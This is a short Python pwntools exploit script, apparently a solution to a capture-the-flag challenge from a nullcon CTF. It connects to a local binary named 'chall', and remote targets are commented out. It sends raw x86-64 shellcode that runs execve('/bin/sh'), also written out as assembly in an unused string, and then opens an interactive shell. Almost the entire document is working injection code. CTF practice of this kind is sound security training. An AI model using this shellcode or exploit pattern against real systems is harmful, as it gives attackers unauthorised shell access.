"""
pagesize: 0x1000

child_do()
{
    fclose( stdin );
    fclose( stdout );
    fclose( stderr );
    
    fd = open("/dev/null", O_RDWR );
    dup2( fd, stdin );
    dup2( fd, stdout );
    dup2( fd, stderr );
}

"""

from pwn import *
from time import sleep

context.log_level = 'debug'
elf = ELF('./chall')
p = process("./chall")
#p = remote("pwn1.ctf.nullcon.net", 5002)
#p = remote("localhost", 7777 )
"""
shellcode = asm( '\n'.join([
    'xor rdx,rdx',
    'push rdx',
    'movabs rax, %s'%u64(b'/bin/sh\0'),
    'push rax',
    'mov rdi,rsp',
    'push rdx',
    'push rdi',
    'mov rsi,rsp',
    'lea rax,[rdx+0x3b]',
    'syscall'
]) )
"""

shellcode = b'\x48\x31\xd2\x52\x48\xb8\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x50\x48\x89\xe7\x52\x57\x48\x89\xe6\x48\x8d\x42\x3b\x0f\x05'
print( 'shellcode: %s'%shellcode )

payload = b''
payload += shellcode

sleep( 1 )
p.sendline( payload )
p.interactive()
